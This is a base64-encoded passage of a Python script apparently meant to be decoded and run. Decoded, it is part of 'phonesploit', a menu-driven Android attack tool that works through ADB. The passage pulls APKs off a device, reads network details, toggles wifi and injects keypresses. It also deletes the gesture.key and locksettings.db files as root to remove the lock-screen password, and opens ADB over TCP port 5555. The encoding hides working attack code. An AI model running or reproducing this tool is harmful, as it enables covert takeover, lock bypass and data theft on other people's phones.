ICBlbGlmIG9wdGlvbiA9PSAnMTgnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBzaGVsbCBpcCBhZGRyZXNzIHNob3cgd2xhbjAiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzE5JzoKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgYSBwYWNrYWdlIG5hbWUuIFRoZXkgbG9vayBsaWtlIHRoaXMgLS0+IGNvbS5zbmFwY2hhdC5hbmRyb2lkIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcGFja2FnZV9uYW1lID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHB1bGxfYXBrKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgcG0gcGF0aCAiK3BhY2thZ2VfbmFtZSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAgICBbezB9K3sxfV1FbnRlciBUaGUgcGF0aC5sb29rcyBsaWtlIHRoaXMgL2RhdGEvYXBwL2NvbS5zbmFwY2hhdC5hbmRyb2lkLXFXZ0RjQmlDRXZBTnE2b3BfTlBxZUE9PS9iYXNlLmFwayIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIHBhdGggPSByYXdfaW5wdXQoIiAgICAgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHB1bGxfYXBrKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBwcmludCAoKCIgICAgICAgICAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAgICAgICAgW3swfSt7MX1dRW50ZXIgVGhlIGxvY2F0aW9uIHRvIHN0b3JlIHRoZSBhcGs6IFtEZWZhdWx0OiBwcmVzZW50IHdvcmtpbmcgZGlyZWN0b3J5XSIpICAuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgbG9jYXRpb24gPSAgIHJhd19pbnB1dCgiICAgICAgICAgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHB1bGxfYXBrKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsiIHB1bGwgIitwYXRoKyIgIitsb2NhdGlvbikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcyMCc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIgK2RldmljZV9uYW1lKyAiIHNoZWxsIGR1bXBzeXMgYmF0dGVyeSIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMjEnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBzaGVsbCBuZXRzdGF0IikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcyMic6CiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XSBUbyB0dXJuIHdpZmkgYmFjayBvbiB5b3UgbmVlZCB0aGUgZGV2aWNlIHRvIGJlIHBsdWdlZCBpbi4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIG9uX29mZiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgIiAgICBbIitGb3JlLlJFRCsiKyIrRm9yZS5XSElURSsiXVdvdWxkIHlvdSBsaWtlIHRoZSB3aWZpICIrRm9yZS5HUkVFTiArIm9uIitGb3JlLldISVRFICsiLyIrRm9yZS5SRUQgKyJvZmYgIitGb3JlLldISVRFKQogICAgICAgICAgICBpZiBvbl9vZmYgPT0gJ29mZic6CiAgICAgICAgICAgICAgICBjb21tYW5kID0gIiBzaGVsbCBzdmMgd2lmaSBkaXNhYmxlIgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29tbWFuZCA9ICIgc2hlbGwgc3ZjIHdpZmkgZW5hYmxlIgoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZStjb21tYW5kKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzIzJzoKICAgICAgICAgICAgcHJpbnQgKChGb3JlLldISVRFICsgIiAgICBbezB9K3sxfV17MX1USEUgREVWSUNFIE5FRURTIFRPIEJFIFJPT1RFRCBUTyBDT05USU5VRSBUTyBFWElUIFVTRSBDVFJMICtDIFRISVMgSVMgQUxTTyBVTlRFU1RFRCIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgIioqKioqKioqKioqKioqKioqKlRSWUlORyBUTyBSRU1PVkUgUEFTUyoqKioqKioqKioqKioqKioqKiIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzdSAwICdybSAvZGF0YS9zeXN0ZW0vZ2VzdHVyZS5rZXknIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHN1IDAgJ3JtIC9kYXRhL3N5c3RlbS9sb2Nrc2V0dGluZ3MuZGInIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHN1IDAgJ3JtIC9kYXRhL3N5c3RlbS9sb2Nrc2V0dGluZ3MuZGItd2FsJyIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzdSAwICdybSAvZGF0YS9zeXN0ZW0vbG9ja3NldHRpbmdzLmRiLXNobSciKQogICAgICAgICAgICBwcmludCAoRm9yZS5SRUQgKyAiKioqKioqKioqKioqKioqKioqVFJZSU5HIFRPIFJFTU9WRSBQQVNTKioqKioqKioqKioqKioqKioqIikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcyNCc6CiAgICAgICAgICAgIHByaW50ICgnJycKICAgIDAgLS0+ICAiS0VZQ09ERV9VTktOT1dOIgogICAgMSAtLT4gICJLRVlDT0RFX01FTlUiCiAgICAyIC0tPiAgIktFWUNPREVfU09GVF9SSUdIVCIKICAgIDMgLS0+ICAiS0VZQ09ERV9IT01FIgogICAgNCAtLT4gICJLRVlDT0RFX0JBQ0siCiAgICA1IC0tPiAgIktFWUNPREVfQ0FMTCIKICAgIDYgLS0+ICAiS0VZQ09ERV9FTkRDQUxMIgogICAgNyAtLT4gICJLRVlDT0RFXzAiCiAgICA4IC0tPiAgIktFWUNPREVfMSIKICAgIDkgLS0+ICAiS0VZQ09ERV8yIgogICAgMTAgLS0+ICAiS0VZQ09ERV8zIgogICAgMTEgLS0+ICAiS0VZQ09ERV80IgogICAgMTIgLS0+ICAiS0VZQ09ERV81IgogICAgMTMgLS0+ICAiS0VZQ09ERV82IgogICAgMTQgLS0+ICAiS0VZQ09ERV83IgogICAgMTUgLS0+ICAiS0VZQ09ERV84IgogICAgMTYgLS0+ICAiS0VZQ09ERV85IgogICAgMTcgLS0+ICAiS0VZQ09ERV9TVEFSIgogICAgMTggLS0+ICAiS0VZQ09ERV9QT1VORCIKICAgIDE5IC0tPiAgIktFWUNPREVfRFBBRF9VUCIKICAgIDIwIC0tPiAgIktFWUNPREVfRFBBRF9ET1dOIgogICAgMjEgLS0+ICAiS0VZQ09ERV9EUEFEX0xFRlQiCiAgICAyMiAtLT4gICJLRVlDT0RFX0RQQURfUklHSFQiCiAgICAyMyAtLT4gICJLRVlDT0RFX0RQQURfQ0VOVEVSIgogICAgMjQgLS0+ICAiS0VZQ09ERV9WT0xVTUVfVVAiCiAgICAyNSAtLT4gICJLRVlDT0RFX1ZPTFVNRV9ET1dOIgogICAgMjYgLS0+ICAiS0VZQ09ERV9QT1dFUiIKICAgIDI3IC0tPiAgIktFWUNPREVfQ0FNRVJBIgogICAgMjggLS0+ICAiS0VZQ09ERV9DTEVBUiIKICAgIDI5IC0tPiAgIktFWUNPREVfQSIKICAgIDMwIC0tPiAgIktFWUNPREVfQiIKICAgIDMxIC0tPiAgIktFWUNPREVfQyIKICAgIDMyIC0tPiAgIktFWUNPREVfRCIKICAgIDMzIC0tPiAgIktFWUNPREVfRSIKICAgIDM0IC0tPiAgIktFWUNPREVfRiIKICAgIDM1IC0tPiAgIktFWUNPREVfRyIKICAgIDM2IC0tPiAgIktFWUNPREVfSCIKICAgIDM3IC0tPiAgIktFWUNPREVfSSIKICAgIDM4IC0tPiAgIktFWUNPREVfSiIKICAgIDM5IC0tPiAgIktFWUNPREVfSyIKICAgIDQwIC0tPiAgIktFWUNPREVfTCIKICAgIDQxIC0tPiAgIktFWUNPREVfTSIKICAgIDQyIC0tPiAgIktFWUNPREVfTiIKICAgIDQzIC0tPiAgIktFWUNPREVfTyIKICAgIDQ0IC0tPiAgIktFWUNPREVfUCIKICAgIDQ1IC0tPiAgIktFWUNPREVfUSIKICAgIDQ2IC0tPiAgIktFWUNPREVfUiIKICAgIDQ3IC0tPiAgIktFWUNPREVfUyIKICAgIDQ4IC0tPiAgIktFWUNPREVfVCIKICAgIDQ5IC0tPiAgIktFWUNPREVfVSIKICAgIDUwIC0tPiAgIktFWUNPREVfViIKICAgIDUxIC0tPiAgIktFWUNPREVfVyIKICAgIDUyIC0tPiAgIktFWUNPREVfWCIKICAgIDUzIC0tPiAgIktFWUNPREVfWSIKICAgIDU0IC0tPiAgIktFWUNPREVfWiIKICAgIDU1IC0tPiAgIktFWUNPREVfQ09NTUEiCiAgICA1NiAtLT4gICJLRVlDT0RFX1BFUklPRCIKICAgIDU3IC0tPiAgIktFWUNPREVfQUxUX0xFRlQiCiAgICA1OCAtLT4gICJLRVlDT0RFX0FMVF9SSUdIVCIKICAgIDU5IC0tPiAgIktFWUNPREVfU0hJRlRfTEVGVCIKICAgIDYwIC0tPiAgIktFWUNPREVfU0hJRlRfUklHSFQiCiAgICA2MSAtLT4gICJLRVlDT0RFX1RBQiIKICAgIDYyIC0tPiAgIktFWUNPREVfU1BBQ0UiCiAgICA2MyAtLT4gICJLRVlDT0RFX1NZTSIKICAgIDY0IC0tPiAgIktFWUNPREVfRVhQTE9SRVIiCiAgICA2NSAtLT4gICJLRVlDT0RFX0VOVkVMT1BFIgogICAgNjYgLS0+ICAiS0VZQ09ERV9FTlRFUiIKICAgIDY3IC0tPiAgIktFWUNPREVfREVMIgogICAgNjggLS0+ICAiS0VZQ09ERV9HUkFWRSIKICAgIDY5IC0tPiAgIktFWUNPREVfTUlOVVMiCiAgICA3MCAtLT4gICJLRVlDT0RFX0VRVUFMUyIKICAgIDcxIC0tPiAgIktFWUNPREVfTEVGVF9CUkFDS0VUIgogICAgNzIgLS0+ICAiS0VZQ09ERV9SSUdIVF9CUkFDS0VUIgogICAgNzMgLS0+ICAiS0VZQ09ERV9CQUNLU0xBU0giCiAgICA3NCAtLT4gICJLRVlDT0RFX1NFTUlDT0xPTiIKICAgIDc1IC0tPiAgIktFWUNPREVfQVBPU1RST1BIRSIKICAgIDc2IC0tPiAgIktFWUNPREVfU0xBU0giCiAgICA3NyAtLT4gICJLRVlDT0RFX0FUIgogICAgNzggLS0+ICAiS0VZQ09ERV9OVU0iCiAgICA3OSAtLT4gICJLRVlDT0RFX0hFQURTRVRIT09LIgogICAgODAgLS0+ICAiS0VZQ09ERV9GT0NVUyIKICAgIDgxIC0tPiAgIktFWUNPREVfUExVUyIKICAgIDgyIC0tPiAgIktFWUNPREVfTUVOVSIKICAgIDgzIC0tPiAgIktFWUNPREVfTk9USUZJQ0FUSU9OIgogICAgODQgLS0+ICAiS0VZQ09ERV9TRUFSQ0giCiAgICA4NSAtLT4gICJUQUdfTEFTVF9LRVlDT0RFIgogICAgICAgICAgICAnJycpCiAgICAgICAgICAgIHByaW50ICgoIlt7MH0rezF9XUVudGVyIGEgbnVtYmVyLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIG51bSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGtleWNvZGUpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBpbnB1dCBrZXlldmVudCAiK251bSkKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcyNSc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIgK2RldmljZV9uYW1lKyAiIGR1bXBzeXMgYWN0aXZpdHkiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzAnOgogICAgICAgICAgICBnbG9iYWwgcGFnZTIKICAgICAgICAgICAgaWYgcGFnZTIgPT0gVHJ1ZToKICAgICAgICAgICAgICAgIGNsZWFyKHBhZ2VfMikKICAgICAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY2xlYXIocGFnZV8xKQogICAgICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICdwJzoKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgICAgIHBhZ2UyID0gVHJ1ZQogICAgICAgICAgICBiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80XSkKICAgICAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKQogICAgICAgICAgICBwcmludCAocGFnZV8yKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJ2InOgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICAgICAgcGFnZTIgPSBGYWxzZQogICAgICAgICAgICBiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80XSkKICAgICAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKQogICAgICAgICAgICBwcmludCAocGFnZV8xKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzk5JzoKICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxzZToKICAgICAgICAgICAgb3Muc3lzdGVtKCJlcnJvcjogaW52YWxpZCBtZW51IG9wdGlvbiIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKCiAgICBtYWluKCkKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKZGVmIGNsZWFyKHBhZ2UpOgogICAgZ2xvYmFsIHBhZ2UyCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIGJhbm5lcl90aXRsZSA9IHJhbmRvbS5jaG9pY2UoW2xvZ29fZGVzaWduXzEsbG9nb19kZXNpZ25fMixsb2dvX2Rlc2lnbl8zLGxvZ29fZGVzaWduXzRdKQogICAgcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKSAgICAKICAgIHByaW50IChwYWdlKQoKCgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gIAojIFJ1bgp5biA9IHJhd19pbnB1dChGb3JlLldISVRFICsgIkhhdmUgeW91IGFscmVhZHkgaW5zdGFsbGVkIGFkYiB2aWEgY29tbWFuZCBsaW5lICIrRm9yZS5HUkVFTiArICJZIitGb3JlLldISVRFKyIvIitGb3JlLlJFRCsibiAiK0ZvcmUuV0hJVEUpCmlmIHluID09ICJuIjoKICAgIG9zLnN5c3RlbSgic3VkbyBhcHQgaW5zdGFsbCBhZGIiKQpwcmludCAoRm9yZS5SRUQgKyAiU3RhcnRpbmcgIGFkYiBzZXJ2ZXIuLiIpCm9zLnN5c3RlbSgiYWRiIHRjcGlwIDU1NTUiKQp0LnNsZWVwKDQpCm9zLnN5c3RlbSgnY2xlYXInKQpiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80XSkKcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKQpwcmludCAocGFnZV8xKQptYWluKCkK"))
